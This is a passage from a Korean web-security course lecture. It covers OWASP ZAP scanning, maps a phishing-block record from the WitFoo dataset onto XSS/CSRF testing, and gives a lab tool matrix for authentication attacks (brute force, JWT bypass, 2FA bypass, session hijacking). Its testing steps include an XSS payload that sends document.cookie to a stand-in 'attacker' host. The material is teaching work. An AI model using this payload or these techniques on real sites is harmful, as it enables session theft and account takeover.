**로그·확인 명령**

- `~/.ZAP/zap.log` — 스캐너 실행 로그

**UI / CLI 요점**

- Spider — 링크 탐색 크롤링
- Active Scan — 실제 페이로드 주입 점검
- Report → Generate HTML report — 표준 보고서 출력

> **해석 팁.** 인증 필요 페이지는 **Context에 로그인 폼**을 등록하지 않으면 로그아웃 상태로 스캔되어 커버리지가 급감. `zap-baseline.py`는 수동 확인용 경량 모드.

---

## 실제 사례 (WitFoo Precinct 6 — Email Phishing block 1건)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> 본 lecture *XSS / CSRF 점검* 과 직접 매핑되는 *web request* 는 dataset 에 부족 — 대신 *공격자가 web 외 channel 로 유사 payload 를 전달* 하는 **email_protection_event 차단** record 를 발췌 (XSS/CSRF 가 *web 단독 채널이 아니라 email link/HTML 도 사용* 한다는 학습 강화).

### Case 1: email_protection block — phishingScore=100, threatID 해시

**원본 발췌**:

```text
mo_name=Phishing  action=block  severity=critical  dst=100.64.28.102
ORG-1780 ::: HOST-0121=block ::: CRED-23501={
  "spamSHOST-54395":100,
  "phishSHOST-54395":100,
  "threatsORG-0706Map":[
    {"threatID":"f34c7acc128cd0a3c8409a6f00CRED-2962552fc3373ab290acdc9be2f2ecfe99feaf5",
     "th..."}
  ]
}
```

**dataset 의 email_protection_event 통계**

| 항목 | 값 |
|------|---|
| dst 동일 IP `100.64.28.102` | 다수 차단 이벤트 |
| phishScore | 100 (max) |
| spamScore | 100 (max) |
| threatID | sha256 해시 — *동일 phishing 캠페인* 추적 키 |
| Precinct 6 mo_name | `Phishing` (전체 dataset 에서 8건 확인된 희귀 라벨) |

**해석 — 본 lecture 와의 매핑**

| XSS/CSRF 점검 학습 항목 | 본 record 에서의 증거 |
|------------------------|---------------------|
| **다중 channel 공격** | XSS payload 는 web reflected/stored 외에 *email HTML body* 로도 전달. 본 record 가 email channel 차단 사례 — XSS 점검 시 *email-to-web flow* 도 시나리오로 |
| **threatID 해시 추적** | sha256 형태의 threatID — XSS payload 도 *해시 기반 IOC* 로 관리 가능. 점검 보고서에 발견 payload SHA-256 기재 |
| **score 임계 100** | phish/spam 모두 max = *고확신* 차단. 점검 시 *동일 score 정책* 으로 XSS payload 분류 (suspicion ≥ 0.8 자동 차단) |
| **CSRF token 부재** | (본 record 자체엔 web token 정보 없음) — 학습 시 *email link 가 CSRF 시작점이 될 수 있음* — 1-click 으로 victim browser 에서 인증된 세션의 state 변경 트리거 |

**점검 액션**:
1. WAF + Email gateway 가 *동일 threatID* 로 IOC 공유하는지 확인 (현재 dataset 은 양 channel 분리 운영)
2. 자체 점검 시 XSS payload 를 *email HTML* 에 삽입한 시나리오 추가 (e.g. `<img src=x onerror=fetch('//attacker/'+document.cookie)>` 가 SEG 통과하는지)
3. CSRF 점검은 *Origin/Referer 헤더 검증* 외에 *email-link → 인증된 세션 액션* 추적 시나리오 포함




---

## 부록: 학습 OSS 도구 매트릭스 (lab week06 — 인증/세션)

| step | 카테고리 | 핵심 도구 |
|---|---|---|
| 1 auth | curl 정상/오류/미존재 / Burp Compare / sqlmap auth / 메커니즘 표 |
| 2 brute | **hydra http-post-form** / ffuf / wfuzz / **Burp Intruder Cluster Bomb** / patator |
| 3 password 정책 | curl 다양 / NIST 정책 / **HIBP API k-anonymity** / **zxcvbn** / hashcat |
| 4 entropy | curl 다수 수집 / **Burp Sequencer FIPS 140-2** / **ent** / Python Shannon |
| 5 session fixation | curl 4 단계 (획득→주입→로그인→재사용) / Burp / OWASP ZAP |
| 6 hijacking | XSS payload / **Wireshark/tshark** / **bettercap MITM** / Ferret+Hamster |
| 7 JWT 구조 | base64 + jq / **jwt_tool** / pyjwt / jwt.io / 클레임 표 |
| 8 JWT 서명 우회 | jwt_tool -M at / 수동 alg:none / **hashcat -m 16500** / Burp JWT Editor |
| 9 JWT alg 변조 | alg 변조 표 (CVE-2015-9235, CVE-2016-10555) / jwt_tool / kid LFI / jku URL |
| 10 password reset | 8 패턴 / curl 토큰 분석 / **Host header injection** / sqlmap |
| 11 2FA 우회 | **6 우회 패턴** / Burp Match and Replace / curl OTP brute / pyotp 시간 변조 |
| 12 OAuth | **7 카테고리** / curl flow / Burp OAuth Scanner / **PKCE 검증** / IdP confused deputy |
| 13 안전 세션 | **OWASP 7 권장** / Express session / Spring Security / Django / Redis |
| 14 인증 강화 | **NIST SP 800-63B** / **Argon2id** / HIBP API / **WebAuthn FIDO2** / Redis 잠금 / **fail2ban** |
| 15 verification | 자동 markdown / 위험도 표 / 사용 도구 / sha256 |

### 학생 환경 준비
```bash
sudo apt install -y hydra patator ent fail2ban wireshark bettercap argon2
pip install zxcvbn-cli pyjwt pyotp argon2-cffi webauthn redis
git clone --depth 1 https://github.com/ticarpi/jwt_tool ~/jwt_tool
# WebAuthn: pip install webauthn (py_webauthn)
```
